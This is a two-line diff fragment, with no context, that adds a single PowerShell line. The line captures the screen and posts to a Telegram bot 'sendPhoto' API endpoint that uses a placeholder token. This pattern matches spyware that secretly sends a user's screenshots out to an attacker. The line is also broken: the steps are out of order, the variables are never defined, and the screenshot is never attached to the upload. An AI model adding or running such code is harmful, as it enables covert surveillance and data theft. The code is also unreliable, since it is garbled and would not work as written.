@@ -1,0 +1,2 @@
+$g.CopyFromScreen(0,0,0,0,$bmp.Size); Add-Type -AssemblyName System.Drawing; Invoke-RestMethod -Uri https://api.telegram.org/bot000/sendPhoto -Method Post
+
